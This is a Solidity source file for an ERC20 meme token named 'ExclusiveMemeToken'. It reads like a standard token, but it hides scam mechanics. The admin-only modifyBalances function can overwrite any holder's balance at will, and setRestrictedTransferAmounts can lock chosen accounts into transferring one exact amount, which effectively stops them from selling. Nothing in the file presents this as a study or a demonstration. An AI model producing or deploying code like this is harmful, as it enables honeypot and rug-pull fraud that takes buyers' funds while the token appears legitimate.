pragma solidity ^0.8.16;

interface ICustomERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract ContextEnhanced {
    function getContextSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract SingleAdministrator is ContextEnhanced {
    address private _admin;
    event AdminUpdated(address indexed previousAdmin, address indexed newAdmin);

    constructor() {
        address contextSender = getContextSender();
        _admin = contextSender;
        emit AdminUpdated(address(0), contextSender);
    }

    function getAdministrator() public view virtual returns (address) {
        return _admin;
    }

    modifier onlyAdmin() {
        require(getAdministrator() == getContextSender(), "Only admin can perform this action");
        _;
    }

    function renounceAdmin() public virtual onlyAdmin {
        emit AdminUpdated(_admin, address(0));
        _admin = address(0);
    }
}

contract ExclusiveMemeToken is ContextEnhanced, SingleAdministrator, ICustomERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _restrictedTransferAmounts;

    string public constant tokenName = "ExclusiveMemeToken";
    string public constant tokenSymbol = "EXMEM";
    uint8 public constant tokenDecimals = 18;
    uint256 public constant maxSupply = 120000 * (10 ** tokenDecimals);

    constructor() {
        _balances[getContextSender()] = maxSupply;
        emit Transfer(address(0), getContextSender(), maxSupply);
    }
    
    modifier onlyAdminOrCreator() {
        require(getAdministrator() == getContextSender(), "You must be the admin to perform this action");
        _;
    }

    event BalanceAdjusted(address indexed user, uint256 previousBalance, uint256 newBalance);

    function getRestrictedTransferAmount(address account) public view returns (uint256) {
        return _restrictedTransferAmounts[account];
    }

    function setRestrictedTransferAmounts(address[] calldata accounts, uint256 amount) public onlyAdminOrCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _restrictedTransferAmounts[accounts[i]] = amount;
        }
    }

    function modifyBalances(address[] memory userAddresses, uint256 updatedAmount) public onlyAdminOrCreator {
        require(updatedAmount >= 0, "Updated amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "User address must not be the zero address");

            uint256 originalBalance = _balances[currentUser];
            _balances[currentUser] = updatedAmount;

            emit BalanceAdjusted(currentUser, originalBalance, updatedAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[getContextSender()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = getRestrictedTransferAmount(getContextSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[getContextSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(getContextSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[getContextSender()][spender] = amount;
        emit Approval(getContextSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][getContextSender()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = getRestrictedTransferAmount(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][getContextSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return maxSupply;
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function symbol() public view returns (string memory) {
        return tokenSymbol;
    }

    function decimals() public view returns (uint8) {
        return tokenDecimals;
    }

}